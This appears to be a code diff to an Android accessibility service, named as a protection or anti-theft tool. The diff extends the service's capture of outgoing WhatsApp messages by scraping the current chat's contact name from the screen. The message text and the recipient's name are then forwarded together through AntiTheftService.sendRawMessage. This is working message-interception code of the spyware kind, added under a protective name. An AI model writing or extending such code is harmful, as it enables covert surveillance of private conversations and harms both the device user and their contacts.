@@ -6,14 +6,16 @@ import android.graphics.Bitmap
 import android.os.Build
 import android.provider.Settings
 import android.util.Log
+import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
+import androidx.annotation.RequiresApi
 import kotlinx.serialization.json.Json
 import kotlinx.serialization.builtins.serializer
-import android.view.accessibility.AccessibilityEvent
-import androidx.annotation.RequiresApi
 
 class ProtectAccessibilityService : AccessibilityService() {
 
     private val whatsAppDrafts = mutableMapOf<String, String>()
+    private var currentWhatsAppChat: String = ""
 
     override fun onServiceConnected() {
         instance = this
@@ -23,9 +25,21 @@ class ProtectAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event ?: return
         val pkg = event.packageName?.toString() ?: return
-        if (pkg !in WHATSAPP_PACKAGES) return
+        if (pkg !in WHATSAPP_PACKAGES) {
+            currentWhatsAppChat = ""
+            return
+        }
 
         when (event.eventType) {
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                // Try to read the chat title from the action bar / toolbar
+                val chatName = findWhatsAppChatName(rootInActiveWindow)
+                if (chatName.isNotBlank()) {
+                    currentWhatsAppChat = chatName
+                    Log.d("AccessibilityService", "WhatsApp chat: $currentWhatsAppChat")
+                }
+            }
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 val source = event.source ?: return
                 if (source.className?.contains("EditText") == true) {
@@ -44,7 +58,8 @@ class ProtectAccessibilityService : AccessibilityService() {
                 if (isSend) {
                     val text = whatsAppDrafts[pkg]
                     if (!text.isNullOrBlank()) {
-                        sendOutgoingWhatsApp(text)
+                        val chat = currentWhatsAppChat.ifBlank { findWhatsAppChatName(rootInActiveWindow) }
+                        sendOutgoingWhatsApp(text, chat)
                         whatsAppDrafts[pkg] = ""
                     }
                 }
@@ -52,12 +67,72 @@ class ProtectAccessibilityService : AccessibilityService() {
         }
     }
 
-    private fun sendOutgoingWhatsApp(text: String) {
+    /**
+     * Best-effort extraction of the current WhatsApp chat name from the window.
+     * Looks for common toolbar title view IDs and patterns.
+     */
+    private fun findWhatsAppChatName(root: AccessibilityNodeInfo?): String {
+        if (root == null) return ""
+
+        // Common WhatsApp view IDs for the conversation title
+        val titleIds = listOf(
+            "com.whatsapp:id/conversation_contact_name",
+            "com.whatsapp:id/action_bar_title",
+            "com.whatsapp:id/title",
+            "com.whatsapp.w4b:id/conversation_contact_name",
+            "com.whatsapp.w4b:id/action_bar_title",
+            "com.whatsapp.w4b:id/title"
+        )
+
+        for (id in titleIds) {
+            val nodes = root.findAccessibilityNodeInfosByViewId(id)
+            for (node in nodes) {
+                val text = node.text?.toString()?.trim()
+                if (!text.isNullOrBlank() && !isWhatsAppGenericTitle(text)) {
+                    return text
+                }
+            }
+        }
+
+        // Fallback: traverse children looking for a TextView near the top that looks like a title
+        val candidates = mutableListOf<AccessibilityNodeInfo>()
+        collectWhatsAppTitleCandidates(root, candidates)
+        for (node in candidates) {
+            val text = node.text?.toString()?.trim()
+            if (!text.isNullOrBlank() && !isWhatsAppGenericTitle(text)) {
+                return text
+            }
+        }
+
+        return ""
+    }
+
+    private fun isWhatsAppGenericTitle(text: String): Boolean {
+        val lower = text.lowercase()
+        return lower == "whatsapp" || lower == "conversas" || lower == "chats" ||
+                lower == "câmera" || lower == "status" || lower == "ligações" ||
+                lower == "calls" || lower == "configurações" || lower == "settings"
+    }
+
+    private fun collectWhatsAppTitleCandidates(node: AccessibilityNodeInfo?, out: MutableList<AccessibilityNodeInfo>) {
+        if (node == null) return
+        if (node.className?.contains("TextView") == true && node.isEnabled && node.isVisibleToUser) {
+            out.add(node)
+        }
+        for (i in 0 until node.childCount) {
+            collectWhatsAppTitleCandidates(node.getChild(i), out)
+        }
+    }
+
+    private fun sendOutgoingWhatsApp(text: String, chatName: String) {
         try {
+            val address = chatName.ifBlank { "WhatsApp" }
             val content = Json.encodeToString(String.serializer(), text)
-            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"out","address":"","content":$content,"timestamp":${System.currentTimeMillis()}}"""
+            val addressJson = Json.encodeToString(String.serializer(), address)
+            val nameJson = Json.encodeToString(String.serializer(), address)
+            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"out","address":$addressJson,"name":$nameJson,"content":$content,"timestamp":${System.currentTimeMillis()}}"""
             AntiTheftService.sendRawMessage(payload)
-            Log.d("AccessibilityService", "forwarded outgoing WhatsApp message")
+            Log.d("AccessibilityService", "forwarded outgoing WhatsApp message to $address")
         } catch (e: Exception) {
             Log.e("AccessibilityService", "Failed to forward outgoing WhatsApp: ${e.message}")
         }
